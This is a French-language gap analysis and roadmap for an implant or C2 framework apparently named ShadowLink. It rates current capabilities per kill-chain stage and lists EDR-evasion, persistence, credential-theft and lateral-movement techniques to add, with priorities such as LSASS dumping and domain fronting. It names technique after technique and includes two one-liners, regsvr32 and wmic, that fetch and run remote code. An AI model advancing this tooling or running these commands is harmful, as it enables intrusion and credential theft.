# Analyse Kill Chain - Techniques Avancées vs Actuelles

## Vue d'ensemble par étape de la Kill Chain

| Étape | Technique Actuelle | Niveau | Techniques Avancées Possibles |
|-------|-------------------|--------|------------------------------|
| **1. Delivery** | Stager manuel | ⭐⭐ | HTML Smuggling, ISO/VHD, LNK Polyglot |
| **2. Exploitation** | Exécution directe | ⭐ | LOLBAS, MSBuild, XLL Add-ins |
| **3. Installation** | Reflective PE loading | ⭐⭐⭐⭐ | Module Stomping, Transacted Hollowing |
| **4. C2 Communication** | HTTPS/443 | ⭐⭐⭐ | Domain Fronting, DNS Tunneling, P2P Mesh |
| **5. Execution** | Direct syscalls (Hell's Gate) | ⭐⭐⭐⭐ | Indirect Syscalls, Hardware Breakpoints |
| **6. Persistence** | Registry + Task | ⭐⭐ | COM Hijacking, WMI Subscription, SSP |
| **7. Defense Evasion** | Sleep obfuscation, AMSI/ETW bypass | ⭐⭐⭐ | Polymorphic Engine, PPL Bypass |
| **8. Privilege Escalation** | UAC bypass, BYOVD | ⭐⭐⭐ | Potato Exploits, PrintNightmare |
| **9. Credential Access** | WiFi, browser, vault | ⭐⭐ | LSASS Dump, DCSync, Kerberoasting |
| **10. Lateral Movement** | Non implémenté | ❌ | WMI, DCOM, Pass-the-Hash |
| **11. Exfiltration** | HTTPS direct | ⭐⭐ | DNS Exfil, Steganography |

---

## 1. DELIVERY (Livraison Initiale)

### 🔵 Actuel : Stager manuel (~10KB)
- Reflective PE loading
- RC4 encryption
- Téléchargement HTTPS

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **HTML Smuggling** | Payload encodé en JS, reconstruit côté client, bypass proxies | ⭐⭐⭐ |
| **ISO/VHD Mounting** | Contourne Mark-of-the-Web (MOTW), auto-mount Windows | ⭐⭐ |
| **LNK Polyglot** | Fichier .lnk qui est aussi un autre format (HTA, PS1) | ⭐⭐⭐ |
| **Office Macro-less** | Exploitation via OLE, DDE, ou template injection | ⭐⭐⭐ |
| **OneNote Embedded** | .one avec fichiers attachés exécutables | ⭐⭐ |
| **MSI Side-loading** | Package MSI légitime qui charge DLL malveillante | ⭐⭐⭐ |
| **Signed Binary Proxy** | Utiliser un EXE signé Microsoft pour charger payload | ⭐⭐⭐⭐ |

---

## 2. EXPLOITATION (Exécution Initiale)

### 🔵 Actuel : Exécution directe
- Double-clic utilisateur
- Pas d'exploitation de vulnérabilité

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **LOLBAS Execution** | mshta, wscript, certutil, bitsadmin pour exécuter | ⭐⭐ |
| **Squiblydoo** | regsvr32 /s /n /u /i:URL scrobj.dll | ⭐⭐ |
| **WMIC XSL** | wmic os get /format:evil.xsl | ⭐⭐ |
| **MSBuild Inline Tasks** | Compiler et exécuter C# inline | ⭐⭐⭐ |
| **InstallUtil** | Bypass AppLocker via .NET InstallUtil | ⭐⭐⭐ |
| **Control Panel Items** | .cpl files pour exécution | ⭐⭐ |
| **XLL Excel Add-ins** | DLL déguisée en add-in Excel | ⭐⭐⭐ |

---

## 3. INSTALLATION (Déploiement Payload)

### 🔵 Actuel : Reflective loading
- Chargement en mémoire
- Pas d'écriture disque (fileless)

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **Module Stomping** | Écraser une DLL légitime mappée en mémoire | ⭐⭐⭐⭐ |
| **Transacted Hollowing** | Process hollowing via NTFS transactions | ⭐⭐⭐⭐ |
| **Phantom DLL Hollowing** | Charger DLL, la délinker, remapper payload | ⭐⭐⭐⭐ |
| **PE Ghost Writing** | Écrire PE sans allouer nouvelle mémoire RWX | ⭐⭐⭐⭐ |
| **Thread Stack Spoofing** | Cacher shellcode dans stack frame légitime | ⭐⭐⭐⭐⭐ |
| **Heap Encryption** | Payload chiffré dans heap, déchiffré JIT | ⭐⭐⭐ |
| **Gargoyle** | ROP-based memory hiding (code jamais RX sauf exécution) | ⭐⭐⭐⭐⭐ |

---

## 4. C2 COMMUNICATION

### 🔵 Actuel : HTTPS sur port 443
- WinHTTP API
- Endpoints REST déguisés
- Beacon périodique

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **Domain Fronting** | Utiliser CDN (CloudFront, Azure) pour masquer vrai C2 | ⭐⭐⭐ |
| **DNS over HTTPS (DoH)** | C2 via requêtes DNS chiffrées | ⭐⭐⭐ |
| **DNS Tunneling** | Données encodées dans requêtes/réponses DNS TXT | ⭐⭐⭐ |
| **ICMP Tunneling** | Données dans ping requests | ⭐⭐ |
| **Websocket C2** | Connexion persistante bidirectionnelle | ⭐⭐⭐ |
| **External C2 (Slack/Teams)** | Utiliser APIs légitimes comme canal C2 | ⭐⭐⭐⭐ |
| **Steganography C2** | Données cachées dans images uploadées | ⭐⭐⭐⭐ |
| **Malleable C2 Profiles** | Traffic qui imite parfaitement un service légitime | ⭐⭐⭐⭐ |
| **SMB Named Pipes** | C2 interne via pipes (pas de trafic réseau) | ⭐⭐⭐ |
| **P2P Mesh** | Agents communiquent entre eux, un seul sort | ⭐⭐⭐⭐⭐ |

---

## 5. EXECUTION (Exécution Code)

### 🔵 Actuel : Direct Syscalls (Hell's Gate)
- Résolution dynamique depuis ntdll propre
- Bypass hooks usermode EDR

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **Indirect Syscalls** | Jump dans ntdll pour cacher origine (Halo's Gate) | ⭐⭐⭐⭐ |
| **Syscall Sorting** | Trier syscalls par numéro pour éviter patterns | ⭐⭐⭐ |
| **Hardware Breakpoints** | Utiliser debug registers pour hook custom | ⭐⭐⭐⭐ |
| **Exception-based Execution** | Déclencher exception, handler exécute payload | ⭐⭐⭐⭐ |
| **APC Queue Abuse** | Exécution via Alertable threads + QueueUserAPC | ⭐⭐⭐ |
| **Fiber-based Execution** | Threads légers, moins monitorés | ⭐⭐⭐ |
| **Callback-based Execution** | EnumWindows, EnumFonts comme trampolines | ⭐⭐⭐ |
| **NtQueueApcThreadEx2** | APC injection sans thread alertable | ⭐⭐⭐⭐ |
| **Early Bird APC** | APC avant que le process soit fully initialized | ⭐⭐⭐⭐ |

---

## 6. PERSISTENCE

### 🔵 Actuel : Registry Run + Scheduled Task
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Task Scheduler basic

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **COM Hijacking** | Remplacer CLSID légitime par payload | ⭐⭐⭐ |
| **WMI Event Subscription** | Trigger sur événement (login, timer) | ⭐⭐⭐ |
| **AppInit_DLLs** | DLL chargée dans tout process avec user32 | ⭐⭐ |
| **Image File Execution Options** | Debugger key pour hijack process | ⭐⭐⭐ |
| **Print Monitor** | DLL chargée par spoolsv.exe (SYSTEM) | ⭐⭐⭐⭐ |
| **Security Support Provider** | DLL chargée par lsass.exe | ⭐⭐⭐⭐ |
| **Password Filter** | DLL appelée à chaque changement mdp | ⭐⭐⭐⭐ |
| **Netsh Helper DLL** | DLL chargée par netsh.exe | ⭐⭐⭐ |
| **Time Provider** | DLL chargée par w32time service | ⭐⭐⭐⭐ |
| **Bootkit/UEFI** | Persistence pré-OS (très avancé) | ⭐⭐⭐⭐⭐ |

---

## 7. DEFENSE EVASION

### 🔵 Actuel
- Sleep obfuscation (Ekko)
- AMSI bypass (patching)
- ETW patching
- Process masquerading (PEB)
- String encryption (XOR)

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **Unhook via Disk Read** | Remap ntdll propre depuis disque | ⭐⭐⭐ |
| **Unhook via KnownDlls** | Remap depuis \KnownDlls\ | ⭐⭐⭐ |
| **Timestomping** | Modifier dates fichiers pour blend in | ⭐⭐ |
| **Code Signing** | Signer payload avec cert volé/acheté | ⭐⭐⭐⭐ |
| **Packer/Crypter Custom** | Mutation unique par build | ⭐⭐⭐⭐ |
| **Polymorphic Engine** | Code se modifie à chaque exécution | ⭐⭐⭐⭐⭐ |
| **Metamorphic Code** | Réécriture complète maintenant sémantique | ⭐⭐⭐⭐⭐ |
| **API Hashing** | Résolution APIs par hash, pas strings | ⭐⭐⭐ |
| **Control Flow Obfuscation** | CFG qui casse les décompilateurs | ⭐⭐⭐⭐ |
| **Anti-Debug** | Détection debugger (timing, exceptions) | ⭐⭐⭐ |
| **Anti-VM** | Détection environnements virtualisés | ⭐⭐⭐ |
| **PPL Bypass** | Contourner Protected Process Light | ⭐⭐⭐⭐⭐ |
| **Driver Callback Removal** | Supprimer callbacks kernel des EDR | ⭐⭐⭐⭐⭐ |
| **ETW Threat Intelligence** | Bypass ETW-TI spécifiquement | ⭐⭐⭐⭐ |

---

## 8. PRIVILEGE ESCALATION

### 🔵 Actuel
- UAC Bypass (fodhelper, mock folders)
- BYOVD (driver vulnérable)
- Token manipulation

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **Potato Exploits** | NTLM relay vers service local | ⭐⭐⭐ |
| **PrintNightmare variants** | Spooler service exploitation | ⭐⭐⭐⭐ |
| **Named Pipe Impersonation** | Impersonate client connecting to pipe | ⭐⭐⭐ |
| **Service Misconfiguration** | Unquoted paths, writable service dirs | ⭐⭐ |
| **DLL Search Order Hijacking** | DLL dans répertoire prioritaire | ⭐⭐⭐ |
| **AlwaysInstallElevated** | MSI avec privilèges élevés | ⭐⭐ |
| **Unquoted Service Path** | Injection via espaces dans paths | ⭐⭐ |
| **SeImpersonate Abuse** | Avec tokens de service | ⭐⭐⭐ |
| **Kernel Exploits** | CVE récentes (très risqué) | ⭐⭐⭐⭐⭐ |
| **Shadow Credentials** | msDS-KeyCredentialLink abuse (AD) | ⭐⭐⭐⭐ |

---

## 9. CREDENTIAL ACCESS

### 🔵 Actuel
- WiFi passwords (netsh)
- Browser paths detection
- Windows Credential Manager (Vault)

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **LSASS Dump** | MiniDump ou direct memory read | ⭐⭐⭐ |
| **SAM/SYSTEM Extraction** | Hashes locaux via shadow copy | ⭐⭐⭐ |
| **DCSync** | Simuler DC pour répliquer hashes (AD) | ⭐⭐⭐⭐ |
| **Kerberoasting** | Request TGS, crack offline | ⭐⭐⭐ |
| **AS-REP Roasting** | Users sans pre-auth Kerberos | ⭐⭐⭐ |
| **DPAPI Decryption** | Déchiffrer blobs DPAPI | ⭐⭐⭐⭐ |
| **Keylogging** | Hook clavier pour capture MDP | ⭐⭐ |
| **Input Capture** | Hook GetAsyncKeyState | ⭐⭐ |
| **SSP Injection** | DLL dans lsass pour intercept auth | ⭐⭐⭐⭐ |
| **NTDS.dit Extraction** | Base Active Directory | ⭐⭐⭐⭐ |
| **Token Impersonation** | Voler token d'autre session | ⭐⭐⭐ |

---

## 10. LATERAL MOVEMENT

### 🔵 Actuel : ❌ Non implémenté

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **PsExec-style** | Service creation sur remote | ⭐⭐⭐ |
| **WMI Remote Exec** | Win32_Process.Create() | ⭐⭐⭐ |
| **WinRM/PSRemoting** | PowerShell remote execution | ⭐⭐⭐ |
| **DCOM Execution** | MMC20.Application, ShellWindows | ⭐⭐⭐⭐ |
| **SMB + Named Pipe** | Écriture fichier + déclenchement | ⭐⭐⭐ |
| **RDP Hijacking** | Prendre session RDP existante | ⭐⭐⭐ |
| **SSH Pivoting** | Si OpenSSH installé | ⭐⭐ |
| **Pass-the-Hash** | Auth NTLM sans connaître mdp | ⭐⭐⭐ |
| **Pass-the-Ticket** | Kerberos ticket réutilisation | ⭐⭐⭐⭐ |
| **Overpass-the-Hash** | NTLM → Kerberos ticket | ⭐⭐⭐⭐ |
| **Golden Ticket** | Forged TGT avec krbtgt hash | ⭐⭐⭐⭐⭐ |
| **Silver Ticket** | Forged service ticket | ⭐⭐⭐⭐ |

---

## 11. EXFILTRATION

### 🔵 Actuel : HTTPS direct
- Download/upload via C2
- Même canal que commandes

### 🔴 Techniques Avancées

| Technique | Description | Difficulté |
|-----------|-------------|------------|
| **DNS Exfiltration** | Données encodées en sous-domaines | ⭐⭐⭐ |
| **Cloud Storage** | OneDrive, GDrive, Dropbox APIs | ⭐⭐⭐ |
| **Steganography** | Données cachées dans images | ⭐⭐⭐⭐ |
| **Email Exfil** | Via SMTP ou API Exchange/O365 | ⭐⭐⭐ |
| **Scheduled Transfer** | Exfil uniquement la nuit/weekend | ⭐⭐ |
| **Protocol Tunneling** | HTTP dans DNS, DNS dans ICMP | ⭐⭐⭐⭐ |
| **Chunked/Throttled** | Petits morceaux pour éviter DLP | ⭐⭐⭐ |
| **Archive & Encrypt** | 7z/rar chiffré avant exfil | ⭐⭐ |

---

## Matrice de Couverture ShadowLink

```
                    DELIVERY  EXPLOIT  INSTALL   C2    EXECUTE  PERSIST  EVASION  PRIVESC  CREDS   LATERAL  EXFIL
                    ────────  ───────  ───────  ────  ───────  ───────  ───────  ───────  ─────   ───────  ─────
Niveau Actuel:      ██░░      █░░░     ████     ████  ████     ██░░     ██████   ███░     ██░░    ░░░░     ██░░
                    40%       10%      80%      80%   90%      40%      70%      60%      40%     0%       40%
```

---

## Priorités d'Amélioration Recommandées

### 🚨 Priorité Haute
1. **Indirect Syscalls** - Évolution de Hell's Gate
2. **Domain Fronting** - C2 indetectable
3. **COM Hijacking** - Persistence furtive
4. **LSASS Dump** - Credentials complètes
5. **WMI Lateral Movement** - Propagation réseau

### ⚠️ Priorité Moyenne
6. Polymorphic Stager
7. API Hashing complet
8. Kerberoasting
9. Module Stomping
10. DNS Tunneling

### 📋 Priorité Basse
11. Thread Stack Spoofing
12. Steganography exfil
13. P2P Mesh C2
14. Hardware breakpoint hooks
